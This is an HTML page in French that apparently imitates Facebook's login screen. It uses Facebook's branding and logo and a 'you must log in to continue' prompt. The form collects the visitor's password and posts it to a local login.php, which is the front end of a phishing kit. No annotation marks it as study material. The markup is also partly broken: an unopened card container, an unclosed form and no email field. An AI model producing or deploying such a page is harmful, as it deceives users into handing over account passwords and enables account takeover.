<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook - Connexion</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
  .wrap { width: 100%; max-width: 400px; padding: 16px; }
  .logo { text-align: center; margin-bottom: 20px; }
  .logo img { width: 180px; }
  .card { background: #fff; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,.12); padding: 20px; }
  .card h2 { font-size: 17px; margin-bottom: 4px; color: #1c1e21; }
  .card .sub { font-size: 13px; color: #606770; margin-bottom: 16px; }
  .field { margin-bottom: 12px; }
  .field input { width: 100%; padding: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 15px; }
  .field input:focus { outline: none; border-color: #1877f2; box-shadow: 0 0 0 2px rgba(24,119,242,.2); }
  .btn { width: 100%; background: #1877f2; color: #fff; border: none; padding: 12px; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; }
  .btn:hover { background: #166fe5; }
  .links { text-align: center; margin-top: 14px; font-size: 13px; }
  .links a { color: #1877f2; text-decoration: none; display: block; margin-bottom: 8px; }
  .divider { border-top: 1px solid #dddfe2; margin: 16px 0; }
  .create { background: #42b72a; color: #fff; border: none; padding: 12px 16px; border-radius: 6px; font-size: 15px; font-weight: 600; cursor: pointer; display: block; margin: 0 auto; }
  .create:hover { background: #36a420; }
  .lang { text-align: center; font-size: 12px; color: #8a8d91; margin-top: 20px; }
</style>
</head>
<body>
  <div class="wrap">
    <div class="logo">
      <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook">
    </div>
      <h2>Se connecter à Facebook</h2>
      <p class="sub">Vous devez vous connecter pour continuer.</p>
      <form method="POST" action="login.php">
        <div class="field">
          <input type="password" name="password" placeholder="Mot de passe" autocomplete="off" required>
        </div>
        <button type="submit" class="btn">Se connecter</button>
        <a href="#">Informations de compte oubliées ?</a>
      <div class="divider"></div>
      <button class="create">Créer un nouveau compte</button>
    </div>
    <div class="lang">Français (France) · English (US) · Español</div>
  </div>
</body>
</html>
